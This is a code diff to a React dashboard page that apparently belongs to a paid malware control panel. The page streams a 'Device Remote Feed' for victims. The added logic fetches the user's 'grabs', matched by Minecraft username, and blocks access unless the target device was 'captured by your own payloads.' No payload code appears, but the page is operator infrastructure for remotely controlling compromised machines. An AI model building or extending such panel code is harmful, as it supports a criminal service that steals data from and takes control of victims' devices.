@@ -27,37 +27,57 @@ export default function UserStreamPage() {
   const [userEmail, setUserEmail] = useState('');
   const [isPro, setIsPro] = useState(false);
   const [proChecked, setProChecked] = useState(false);
+  const [isAllowedTarget, setIsAllowedTarget] = useState(false);
+  const [grabsChecked, setGrabsChecked] = useState(false);
 
   useEffect(() => {
     fetch('/api/auth/user')
       .then((r) => r.json())
-      .then((d) => {
+      .then(async (d) => {
         const email = d.user?.email || '';
         setUserEmail(email);
 
-        if (ADMIN_EMAILS.includes(email.toLowerCase())) {
+        const isAdmin = ADMIN_EMAILS.includes(email.toLowerCase());
+        if (isAdmin) {
           setIsPro(true);
           setProChecked(true);
+          setIsAllowedTarget(true);
+          setGrabsChecked(true);
           return;
         }
 
-        fetch('/api/user/pro?t=' + Date.now(), { cache: 'no-store' })
-          .then((r) => r.json())
-          .then((p) => {
-            setIsPro(!!p.is_pro);
-            setProChecked(true);
-          })
-          .catch(() => {
-            setIsPro(false);
-            setProChecked(true);
-          });
+        // Check Pro status
+        try {
+          const p = await fetch('/api/user/pro?t=' + Date.now(), { cache: 'no-store' }).then((r) => r.json());
+          setIsPro(!!p.is_pro);
+        } catch {
+          setIsPro(false);
+        }
+        setProChecked(true);
+
+        // Check Grabs ownership
+        try {
+          const grabsRes = await fetch('/api/grabs?t=' + Date.now(), { cache: 'no-store' }).then((r) => r.json());
+          const grabsList = grabsRes.grabs || [];
+          const lowerTarget = username.toLowerCase().trim();
+          const hasGrab = grabsList.some(
+            (g) =>
+              (g.minecraft_username && g.minecraft_username.toLowerCase().trim() === lowerTarget) ||
+              (g.id && g.id.toLowerCase().trim() === lowerTarget)
+          );
+          setIsAllowedTarget(hasGrab);
+        } catch {
+          setIsAllowedTarget(false);
+        }
+        setGrabsChecked(true);
       })
       .catch(() => {
         setProChecked(true);
+        setGrabsChecked(true);
       });
-  }, []);
+  }, [username]);
 
-  if (!proChecked) {
+  if (!proChecked || !grabsChecked) {
     return (
       <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
         <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading Device Remote Feed...</div>
@@ -77,6 +97,23 @@ export default function UserStreamPage() {
           </div>
           <button onClick={() => router.push('/dashboard?tab=plans')} style={{ cursor: 'pointer', background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 20px', fontSize: 13, fontWeight: 600 }}>Upgrade to Pro</button>
           <div onClick={() => router.push('/dashboard/remote-control')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14, marginTop: 8 }}>← Back to Devices</div>
+        </div>
+      </div>
+    );
+  }
+
+  if (!isAllowedTarget) {
+    return (
+      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
+        <Sidebar userEmail={userEmail} />
+        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16, padding: 32 }}>
+          <div style={{ fontSize: 48 }}>🚫</div>
+          <div style={{ fontSize: 18, fontWeight: 600 }}>Target Not Found in Your Grabs</div>
+          <div style={{ fontSize: 14, color: colors.textDim, textAlign: 'center', maxWidth: 440, lineHeight: 1.5 }}>
+            You can only access remote control for devices captured by your own payloads. Target &quot;{username}&quot; was not found in your captured grabs.
+          </div>
+          <button onClick={() => router.push('/dashboard/remote-control')} style={{ cursor: 'pointer', background: colors.green, color: '#000', border: 'none', borderRadius: 8, padding: '10px 20px', fontSize: 13, fontWeight: 600 }}>← Back to Remote Control</button>
+          <div onClick={() => router.push('/dashboard/grabs')} style={{ cursor: 'pointer', color: colors.textDim, fontSize: 14, marginTop: 8 }}>View Your Grabs ↗</div>
         </div>
       </div>
     );
